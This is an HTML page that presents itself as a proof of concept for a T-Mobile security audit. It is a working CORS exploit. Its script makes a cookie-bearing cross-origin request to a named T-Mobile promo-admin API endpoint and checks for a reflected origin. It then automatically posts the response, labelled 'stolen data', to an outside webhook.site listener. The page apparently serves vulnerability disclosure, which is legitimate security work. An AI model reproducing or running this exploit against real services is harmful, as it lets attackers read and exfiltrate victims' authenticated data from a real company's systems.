<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>T-Mobile Critical Security Audit PoC</title>
    <style>
        :root { --magenta: #e20074; --dark: #0b0e11; --card: #1c2128; --text: #e1e1e1; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--dark); color: var(--text); padding: 40px; }
        .container { max-width: 800px; margin: auto; background: var(--card); border-radius: 12px; border-top: 6px solid var(--magenta); padding: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        h1 { color: var(--magenta); text-align: center; margin-bottom: 30px; }
        .metadata { background: #2d333b; padding: 15px; border-radius: 8px; margin-bottom: 25px; border-left: 5px solid #58a6ff; font-family: monospace; }
        .input-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 10px; font-weight: bold; color: #8b949e; }
        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #444c56; color: white; border-radius: 6px; box-sizing: border-box; font-family: monospace; }
        .btn-run { background: var(--magenta); color: white; border: none; padding: 18px; border-radius: 6px; width: 100%; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
        .btn-run:hover { background: #ff0084; box-shadow: 0 0 20px rgba(226, 0, 116, 0.5); }
        .output-container { margin-top: 30px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; }
        .output-header { background: #30363d; padding: 10px 15px; font-size: 0.8rem; font-weight: bold; display: flex; justify-content: space-between; }
        #stolen-body { padding: 20px; min-height: 100px; white-space: pre-wrap; word-break: break-all; font-family: 'Consolas', monospace; color: #ff7b72; }
        .badge { padding: 3px 8px; border-radius: 4px; font-size: 0.7rem; }
        .vulnerable { background: #f85149; color: white; }
    </style>
</head>
<body>

<div class="container">
    <h1>CORS Data Exfiltration Proof</h1>
    
    <div class="metadata">
        [ATTACKER ORIGIN]: <span id="current-origin"></span><br>
        [WEBHOOK LISTENER]: https://webhook.site/7dedcf0e...
    </div>

    <div class="input-group">
        <label>Target Vulnerable Endpoint (GET):</label>
        <input type="text" id="target-url" value="https://adn.t-mobile.com/prmtns-meg-promo-api/prd01/promo-api/v1/promo-admin/client/1044/asset/MaintenanceText">
    </div>

    <button class="btn-run" onclick="executePoC()">Execute Exploit</button>

    <div class="output-container">
        <div class="output-header">
            <span>STOLEN DATA RESPONSE</span>
            <span id="vuln-badge" class="badge vulnerable" style="display:none;">BYPASS CONFIRMED</span>
        </div>
        <div id="stolen-body">Awaiting execution...</div>
    </div>
</div>

<script>
    document.getElementById('current-origin').innerText = window.location.origin;
    const webhook = "https://webhook.site/7dedcf0e-fa4f-4dba-a805-04d37de87b08";

    async function executePoC() {
        const url = document.getElementById('target-url').value;
        const display = document.getElementById('stolen-body');
        const badge = document.getElementById('vuln-badge');
        
        display.innerText = "Bypassing Same-Origin Policy...";
        display.style.color = "#8b949e";
        badge.style.display = "none";

        try {
            // STEP 1: Perform the cross-origin request with credentials
            const response = await fetch(url, {
                method: 'GET',
                credentials: 'include', // Proof: Browser sends cookies to target
                mode: 'cors'
            });

            // STEP 2: Verify if the Origin was reflected
            const acao = response.headers.get('Access-Control-Allow-Origin');
            const data = await response.text();

            if (acao === window.location.origin) {
                badge.style.display = "inline";
                display.style.color = "#39d353"; // Green text for success
                display.innerText = "ORIGIN REFLECTED: " + acao + "\n\nBODY DATA:\n" + data;
            } else {
                display.innerText = `Status: ${response.status}\nBody: ${data}\n\nNote: Server did not reflect origin. CORS handshake failed.`;
            }

            // STEP 3: Auto-exfiltrate stolen data to your webhook
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    url: url,
                    status: response.status,
                    stolen_data: data,
                    acao_received: acao
                })
            });

        } catch (err) {
            display.style.color = "#f85149";
            display.innerText = "CORS Error: Browser blocked the cross-origin read. \n\nEnsure you are on https://fermionicplants.github.io and have accepted the T-Mobile certificate in a separate tab.";
        }
    }
</script>

</html>
